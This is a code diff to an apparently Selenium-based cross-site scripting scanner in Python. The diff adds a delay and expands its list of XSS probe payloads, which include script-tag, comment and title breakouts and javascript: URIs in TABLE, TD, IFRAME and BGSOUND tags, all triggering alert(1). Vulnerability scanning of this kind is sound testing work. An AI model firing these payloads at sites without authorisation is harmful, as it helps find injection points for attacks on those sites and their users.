@@ -1,4 +1,5 @@
 from selenium.common.exceptions import UnexpectedAlertPresentException
+import time
 
 class XSSCommands:
 	def __init__(self, webdriver, logger):
@@ -17,6 +18,7 @@ class XSSCommands:
 		for x in urls_to_try:
 			try:
 				self.driver.get(x)
+				time.sleep(2)
 				self.driver.get(current_url)
 			except UnexpectedAlertPresentException:
 				print "XSS - "+x
@@ -38,12 +40,20 @@ class XSS_Url_Suggestor:
 	def get_xss_urls(self):
 		rtnData = []
 		xss_attacks = ['<script>alert(1)</script>',
-						'<img src=x onerror="alert(1)" />'
+						'</script><script>alert(1)</script>',
+						'<img src=x onerror="alert(1)" />',
 						"'/><img src=x onerror='alert(1)' />",
 						'"/><img src=x onerror="alert(1)" />',
 						';alert(1);',
 						'";alert(1);',
 						"';alert(1);",
+						'--><script>alert(1)</script>',
+						'</title><script>alert(1)</script>',
+						'<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
+						'<TD BACKGROUND="javascript:alert(\'XSS\')">',
+						'<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
+						'<BGSOUND SRC="javascript:alert(\'XSS\');">'
+						
 						]
 						
 		urlsplitloc = self.url.find("?")
